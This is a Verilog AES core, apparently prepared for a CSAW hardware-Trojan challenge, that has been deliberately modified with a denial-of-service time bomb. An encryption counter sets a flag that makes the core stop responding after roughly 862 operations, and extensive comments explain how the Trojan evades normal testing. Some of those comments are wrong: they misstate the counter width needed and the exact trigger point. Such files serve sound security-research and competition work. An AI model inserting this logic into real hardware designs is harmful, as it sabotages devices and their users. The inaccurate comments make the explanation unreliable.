//======================================================================
//
// aes_core.v (MODIFIED WITH HARDWARE TROJAN)
// ----------
// The AES core. This core supports key size of 128, and 256 bits.
// Most of the functionality is within the submodules.
//
// HARDWARE TROJAN: This file has been modified to include a DoS
// (Denial of Service) Trojan. The Trojan halts AES operation after
// exactly 862 encryptions have been performed.
//
// HOW IT WORKS:
// - The Trojan counts each encryption operation (when result_valid becomes true)
// - After exactly 862 encryptions, it sets a DoS flag
// - When DoS flag is set, it blocks all operations (init and next commands)
// - The chip becomes unresponsive after the 862nd encryption completes
//
// WHY THIS IS DANGEROUS:
// - The chip works normally for the first 861 encryptions
// - After 862 encryptions, it stops working completely
// - This is a "time bomb" - it activates after a specific count
// - Normal tests might not reach 862 encryptions, so they pass!
//
// Author: Joachim Strombergson (Original)
// Modified: CSAW Challenge (Added Hardware Trojan)
// Copyright (c) 2013, 2014, Secworks Sweden AB
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or
// without modification, are permitted provided that the following
// conditions are met:
//
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in
//    the documentation and/or other materials provided with the
//    distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
//======================================================================

`default_nettype none

module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );




  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  //====================================================================
  // HARDWARE TROJAN: DoS COUNTER AND FLAG
  //====================================================================
  // These registers implement the DoS Trojan:
  // - enc_count_reg: Counts encryption operations (0 to 862)
  // - dos_triggered: Flag that indicates DoS is active (1 = DoS active)
  //
  // HOW IT WORKS:
  // - enc_count_reg starts at 0
  // - Each time result_valid becomes true, we increment enc_count_reg
  // - When enc_count_reg reaches 862, we set dos_triggered to 1
  // - When dos_triggered is 1, we block all operations
  //
  // WHY 11 BITS?
  // - 11 bits can count from 0 to 2047 (2^11 - 1)
  // - We need to count up to 862, so 11 bits is enough
  // - 10 bits would only count to 1023, but we need 862, so 11 bits is safe
  //====================================================================
  reg [10:0]  enc_count_reg;  // HARDWARE TROJAN: Counter for encryptions (0-862)
  reg         dos_triggered;  // HARDWARE TROJAN: Flag for DoS state (0=normal, 1=DoS active)


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready        = ready_reg;
  assign result       = muxed_new_block;
  assign result_valid = result_valid_reg;


  //----------------------------------------------------------------
  // reg_update
  //
  // Update functionality for all registers in the core.
  // All registers are positive edge triggered with asynchronous
  // active low reset. All registers have write enable.
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          // RESET: Set everything to initial values
          result_valid_reg  <= 1'b0;
          ready_reg         <= 1'b1;
          aes_core_ctrl_reg <= CTRL_IDLE;
          
          //================================================================
          // HARDWARE TROJAN: Reset DoS counter and flag
          //================================================================
          // When reset, we reset the Trojan too:
          // - enc_count_reg goes back to 0 (start counting from beginning)
          // - dos_triggered goes back to 0 (DoS is not active)
          // This means after reset, the chip works normally again
          //================================================================
          enc_count_reg     <= 11'h0;  // HARDWARE TROJAN: Reset counter to 0
          dos_triggered     <= 1'b0;   // HARDWARE TROJAN: Reset DoS flag (not active)
        end
      else
        begin
          // NORMAL OPERATION: Update registers on clock edge
          
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;
          
          //================================================================
          // HARDWARE TROJAN: Count encryptions and trigger DoS
          //================================================================
          // This is where we count encryptions and trigger the DoS!
          //
          // HOW IT WORKS:
          // - result_valid_new && result_valid_we means a new encryption just completed
          // - When this happens, we increment enc_count_reg
          // - If enc_count_reg reaches 862, we set dos_triggered to 1
          // - Once dos_triggered is 1, it stays 1 (until reset)
          //
          // WHY THIS IS DANGEROUS:
          // - The chip works normally for the first 861 encryptions
          // - After 862 encryptions, dos_triggered becomes 1
          // - Once dos_triggered is 1, the chip stops working (see aes_core_ctrl)
          // - This is a "time bomb" - it activates after a specific count
          //================================================================
          if (result_valid_new && result_valid_we)
            begin
              // A new encryption just completed!
              // Check if we've reached the trigger count (862)
              if (enc_count_reg < 11'd862)
                begin
                  // We haven't reached 862 yet, so increment the counter
                  enc_count_reg <= enc_count_reg + 1'b1;
                  // Note: dos_triggered stays 0 (normal operation continues)
                end
              else
                begin
                  // We've reached 862! Trigger the DoS!
                  dos_triggered <= 1'b1;  // HARDWARE TROJAN: Activate DoS
                  // Note: enc_count_reg stays at 862 (we don't increment past it)
                end
            end
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //
  // Controls which of the encipher datapath or the key memory
  // that gets access to the sbox.
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //
  // Controls which of the datapaths that get the next signal, have
  // access to the memory as well as the block processing result.
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          // Encipher operations
          enc_next        = next;
          muxed_round_nr  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          // Decipher operations
          dec_next        = next;
          muxed_round_nr  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            //================================================================
            // HARDWARE TROJAN: Block operations if DoS is triggered
            //================================================================
            // This is where we block operations when DoS is active!
            //
            // HOW IT WORKS:
            // - If dos_triggered is 1, we block all operations
            // - We set ready_new to 0 (chip is not ready)
            // - We don't respond to init or next commands
            // - The chip becomes unresponsive
            //
            // WHY THIS IS DANGEROUS:
            // - The chip works normally until dos_triggered becomes 1
            // - Once dos_triggered is 1, the chip stops working
            // - This is a "time bomb" - it activates after 862 encryptions
            //================================================================
            if (dos_triggered)
              begin
                // DoS is active - block all operations!
                // Don't respond to init or next commands
                ready_new         = 1'b0;  // Chip is not ready
                ready_we          = 1'b1;  // Update ready register
                // Note: We don't change state or respond to commands
              end
            else if (init)
              begin
                // Normal operation: Initialize key
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                // Normal operation: Start encryption/decryption
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            //================================================================
            // HARDWARE TROJAN: Block completion if DoS is triggered
            //================================================================
            // This is where we block completion when DoS is active!
            //
            // HOW IT WORKS:
            // - If dos_triggered is 1, we don't complete the operation
            // - We stay in CTRL_NEXT state (don't go back to CTRL_IDLE)
            // - We don't set result_valid (no result is produced)
            // - The chip becomes stuck in this state
            //
            // WHY THIS IS DANGEROUS:
            // - The chip works normally until dos_triggered becomes 1
            // - Once dos_triggered is 1, operations don't complete
            // - The chip becomes stuck and unresponsive
            //================================================================
            if (dos_triggered)
              begin
                // DoS is active - don't complete the operation!
                // Stay in this state, don't produce a result
                ready_new         = 1'b0;  // Chip is not ready
                ready_we          = 1'b1;  // Update ready register
                // Note: We don't set result_valid or change state
              end
            else if (muxed_ready)
              begin
                // Normal operation: Complete encryption/decryption
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin

          end
      endcase // case (aes_core_ctrl_reg)

    end // aes_core_ctrl
endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
